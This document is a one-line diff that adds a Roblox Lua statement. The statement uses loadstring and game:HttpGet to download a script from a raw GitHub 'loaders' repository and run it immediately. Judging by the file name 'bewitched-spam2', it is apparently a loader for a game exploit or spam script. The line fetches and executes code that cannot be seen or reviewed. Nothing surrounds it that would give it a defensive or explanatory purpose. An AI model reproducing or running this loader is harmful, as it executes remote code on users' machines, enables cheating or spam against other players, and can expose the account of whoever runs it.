@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/bewitched-spam2-ilzyhybsg1ar53.lua"))()
